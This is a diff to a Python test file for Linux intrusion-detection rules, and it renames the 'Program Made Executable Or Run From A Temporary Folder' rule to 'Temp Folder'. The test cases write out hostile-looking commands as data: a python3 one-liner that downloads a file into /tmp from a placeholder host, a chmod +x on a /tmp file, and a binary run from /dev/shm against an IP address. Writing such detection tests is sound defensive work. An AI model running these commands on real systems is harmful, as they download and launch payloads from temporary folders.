@@ -106,10 +106,10 @@ CASES = [
                                  "python3 -c import urllib.request;urllib.request.urlretrieve('http://x/a','/tmp/a')"),
      {"File Downloaded Into A Temporary Folder On Linux"}),
     ("linux_process_exec", exec_("/usr/bin/chmod", "chmod +x /tmp/k"),
-     {"Program Made Executable Or Run From A Temporary Folder On Linux"}),
+     {"Program Made Executable Or Run From A Temp Folder On Linux"}),
     ("linux_process_exec", exec_("/usr/bin/chmod", "chmod 644 /tmp/notes"), set()),
     ("linux_process_exec", exec_("/dev/shm/k", "/dev/shm/k -c 203.0.113.9"),
-     {"Program Made Executable Or Run From A Temporary Folder On Linux"}),
+     {"Program Made Executable Or Run From A Temp Folder On Linux"}),
 ]
 
 OURS = {
@@ -119,7 +119,7 @@ OURS = {
     "Shell Startup File Changed By A Non-Editor On Linux", "Sudoers Or PAM Configuration Written On Linux",
     "Autostart, Udev Or MOTD Script Written On Linux", "Account File Written Outside Account Tools On Linux",
     "LibreOffice Started A Shell Or Interpreter", "File Downloaded Into A Temporary Folder On Linux",
-    "Program Made Executable Or Run From A Temporary Folder On Linux",
+    "Program Made Executable Or Run From A Temp Folder On Linux",
 }
 
 
